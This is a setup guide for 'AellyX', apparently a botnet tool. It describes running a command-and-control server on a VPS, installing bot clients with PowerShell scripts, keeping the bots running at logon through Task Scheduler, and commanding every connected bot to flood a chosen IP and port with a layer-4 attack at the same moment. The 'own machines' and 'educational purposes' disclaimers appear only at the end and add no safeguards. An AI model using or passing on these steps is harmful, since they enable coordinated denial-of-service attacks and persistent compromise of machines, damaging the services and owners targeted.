# AellyX Bot Network Setup Guide

This guide explains how to set up an AellyX C&C server on your VPS and connect bot clients from your test machines.

## Architecture

```
┌─────────────────┐
│  Your VPS       │
│  (C&C Server)   │
│  Port: 5261     │
└────────┬────────┘
         │
    ┌────┴────┐
    │ HTTP    │
    │ Commands│
    └────┬────┘
         │
   ┌─────┴─────┐
   │           │
┌──┴──┐     ┌──┴──┐
│Bot 1│     │Bot 2│
│(PC) │     │(PC) │
└─────┘     └─────┘
```

## Step 1: Set Up the C&C Server (on your VPS)

1. Copy `setup_server.ps1` to your VPS
2. Run:
   ```powershell
   .\setup_server.ps1 -HostIP "0.0.0.0" -Port 5261 -Password "your-secret-password"
   ```
3. Make sure port 5261 is open in your firewall

## Step 2: Set Up Bot Clients (on test machines)

1. Copy `setup_bot.ps1` to each test machine
2. Run:
   ```powershell
   .\setup_bot.ps1 -ServerUrl "http://YOUR-VPS-IP:5261/" -Password "your-secret-password"
   ```
3. The bot will connect and wait for commands

## Step 3: Control Your Bots

On your VPS or any machine with AellyX:

1. Run `python main.py`
2. Type `ddos`
3. Enter your server URL: `http://YOUR-VPS-IP:5261/`
4. Enter your password
5. Choose **YES** to be the controller
6. Now every command you type is sent to all connected bots!

## Example Attack Flow (on your own test target)

1. Controller types: `l4`
2. Controller types: `ip 192.168.1.100` (your test target)
3. Controller types: `port 80`
4. Controller types: `threads 10`
5. Controller types: `run`
6. All bots execute the attack simultaneously

## Files Created

| File | Purpose |
|------|---------|
| `setup_server.ps1` | Installs and runs C&C server |
| `setup_bot.ps1` | Installs and runs bot client |

## Adding Bot to Startup (Optional)

To have the bot auto-start when Windows boots:

1. Open Task Scheduler (`taskschd.msc`)
2. Click "Create Basic Task"
3. Name: `AellyX Bot`
4. Trigger: `When I log on`
5. Action: `Start a program`
6. Program: `%LOCALAPPDATA%\AellyX\run_bot.bat`
7. Finish

## Security Notes

- Always use a strong password
- Only run on machines you own
- This is for educational/testing purposes only
